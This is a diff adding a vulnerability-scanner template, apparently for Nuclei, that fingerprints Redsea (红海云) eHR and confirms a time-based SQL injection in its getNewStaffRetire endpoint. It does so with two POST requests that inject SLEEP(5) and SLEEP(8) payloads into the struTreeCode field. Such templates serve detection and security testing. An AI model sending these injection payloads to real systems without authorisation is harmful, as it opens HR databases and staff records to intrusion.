@@ -1,0 +1,61 @@
+id: poc-yaml-hr-soft-getnewstaffretire-sqli
+info:
+  name: "红海云eHR getNewStaffRetire SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 红海云eHR
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+        part: body
+
+  - id: 2
+    raw:
+      - |
+        POST /RedseaPlatform/BossIndex.mob HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        method=getNewStaffRetire&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5)))ShXk)+AND+%27qmyT%27=%27qmyT
+      - |
+        POST /RedseaPlatform/BossIndex.mob HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        method=getNewStaffRetire&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP(8)))ShXk)+AND+%27qmyT%27=%27qmyT
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "\"meg\":\"\u5904\u7406\u6210\u529F\""
+          - "\"jsonList\":"
+        part: body
+      - type: word
+        words:
+          - "text/json"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
